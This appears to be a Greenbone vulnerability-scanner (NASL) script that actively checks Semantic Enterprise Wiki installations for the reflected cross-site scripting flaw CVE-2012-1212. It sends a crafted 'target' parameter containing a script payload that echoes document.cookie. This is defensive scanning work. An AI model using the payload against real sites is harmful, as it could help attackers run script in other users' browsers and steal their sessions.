# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802709");
  script_version("2023-05-12T16:07:31+0000");
  script_tag(name:"last_modification", value:"2023-05-12 16:07:31 +0000 (Fri, 12 May 2023)");
  script_tag(name:"creation_date", value:"2012-03-16 16:34:28 +0530 (Fri, 16 Mar 2012)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2012-1212");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Semantic Enterprise Wiki <= 1.6.0_2 XSS Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Semantic Enterprise Wiki is prone to a cross-site scripting
  (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an input passed via the 'target' parameter
  to 'index.php/Special:FormEdit' is not properly sanitised in the 'smwfOnSfSetTargetName()'
  function before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute
  arbitrary web script or HTML in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"Semantic Enterprise Wiki (SMW+) 1.6.0_2 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47968");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51980");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73167");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/109637/SMW-1.5.6-Cross-Site-Scripting.html");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

foreach dir (make_list_unique("/", "/mediawiki", "/smw", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  res = http_get_cache(port: port, item: dir + "/index.php/Main_Page");
  if (res !~ "^HTTP/1\.[01] 200" || "SMW" >!< res || "semantic enterprise wiki" >!< res)
    continue;

  url = dir + "/index.php/Special:FormEdit?target='%3Balert(document.cookie)%2F%2F\&categories=Calendar+";

  if (http_vuln_check(port: port, url: url, pattern: ";alert(document\.cookie)\/\/\\'", check_header: TRUE)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
